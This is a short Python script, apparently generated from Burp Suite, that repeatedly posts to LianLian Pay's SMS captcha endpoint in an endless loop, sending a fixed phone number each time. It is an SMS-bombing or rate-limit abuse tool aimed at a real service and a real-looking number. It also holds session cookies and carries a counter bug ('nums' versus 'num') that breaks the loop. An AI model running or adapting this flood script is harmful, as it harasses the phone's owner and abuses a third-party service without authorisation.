import requests

nums = 0
while True:
    burp0_url = (
        "https://global.lianlianpay.com:443/cb-va-sso-api/captcha/send/mobile/unblock"
    )
    burp0_cookies = {
        "sajssdk_2015_cross_new_user": "1",
        "sensorsdata2015jssdkcross": "%7B%22distinct_id%22%3A%22176956e653225e-0789fdc4d74052-f7b1332-1764000-176956e65336e9%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_landing_page%22%3A%22https%3A%2F%2Fglobal.lianlianpay.com%2Fregister%3Ffrom%3Dglobal%22%7D%2C%22%24device_id%22%3A%22176956e653225e-0789fdc4d74052-f7b1332-1764000-176956e65336e9%22%7D",
    }
    burp0_headers = {
        "Connection": "close",
        "Accept": "application/json, text/plain, */*",
        "source": "PC",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://global.lianlianpay.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://global.lianlianpay.com/register?from=global",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }
    burp0_json = {
        "isTrusted": True,
        "mobileDistrict": "CN",
        "phone": "18668491096",
        "region": "US",
        "typeCode": "Captcha001",
    }
    resp = requests.post(
        burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json
    )
    num += 1
    print(num, resp, resp.text)
